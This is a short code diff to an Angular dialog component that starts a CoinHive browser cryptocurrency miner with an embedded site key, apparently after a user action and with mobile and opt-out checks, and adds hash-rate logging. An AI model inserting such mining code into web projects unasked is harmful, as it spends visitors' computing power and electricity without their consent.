@@ -14,12 +14,24 @@ export class DialogComponent {
   constructor(public dialogRef: MatDialogRef<DialogComponent>, private bottomSheet: MatBottomSheet) { }
 
   openMiner() {
-    var miner = new CoinHive.Anonymous('WbWeCFFLVH6mLfn3OYt48oXvUhGiwj2j', { throttle: 0.3 });
+    const miner = new CoinHive.Anonymous('WbWeCFFLVH6mLfn3OYt48oXvUhGiwj2j', { throttle: 0.3 });
     // Only start on non-mobile devices and if not opted-out
     // in the last 14400 seconds (4 hours):
     if (!miner.isMobile() && !miner.didOptOut(14400)) {
       miner.start();
     }
+    miner.on('found', function () { /* Hash found */ });
+    miner.on('accepted', function () { /* Hash accepted by the pool */ });
+    // Update stats once per second
+    setInterval(function () {
+      const hashesPerSecond = miner.getHashesPerSecond(),
+                totalHashes = miner.getTotalHashes(),
+             acceptedHashes = miner.getAcceptedHashes();
+      // Output to HTML elements...
+      console.log(hashesPerSecond);
+      console.log(hashesPerSecond);
+      console.log(hashesPerSecond);
+    }, 1000);
     this.dialogRef.close();
     console.log('openMiner ran');
   }
